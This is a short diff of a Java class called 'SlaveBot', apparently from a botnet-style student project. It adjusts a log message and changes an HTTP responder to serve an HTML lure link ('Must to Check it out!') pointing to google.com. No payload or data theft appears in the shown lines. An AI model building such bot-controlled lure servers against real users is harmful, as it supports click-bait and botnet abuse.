@@ -191,7 +191,7 @@ public class SlaveBot {
                                 srvSock.close();
                                 System.out.println("Deleted server socket from port :" + tgtPort);
                             } else {
-                                System.out.println("Try to Deleted invalid server socket from port :" + tgtPort);
+                                System.out.println("Try to Deleted server socket from port :" + tgtPort);
                             }
                         }
                         //others
@@ -402,13 +402,20 @@ public class SlaveBot {
                         System.out.println(urlReqStr);
                     }
                     outUrlRsp.println("HTTP/1.1 200 ");
-                    outUrlRsp.println("Content-Type:text/plain ");
+                    //outUrlRsp.println("Content-Type:text/plain ");
+                    outUrlRsp.println("Content-Type:text/html ");
                     outUrlRsp.println("Content:close");
                     outUrlRsp.println("");
-                    outUrlRsp.println("This is Important,Check this out!");
+                    outUrlRsp.println("");
+                    //outUrlRsp.println("This is Important,Check this out!");
 
-                    String link="<a href='http://localhost:8080' target='_blank'>http://localhost:8080</a>";
+                    //String link="<a href='http://localhost:8080' target='_blank'>http://localhost:8080</a>";
+                    //outUrlRsp.println("<html>");
+                    //outUrlRsp.println("<body>");
+                    String link="<p> <a href=\"http://www.google.com\">Must to Check it out!</a> </p>";
                     outUrlRsp.println(link);
+                    //outUrlRsp.println("</body>");
+                    //outUrlRsp.println("</html>");
                     outUrlRsp.flush();
                     /*
                     outUrlRsp.flush();
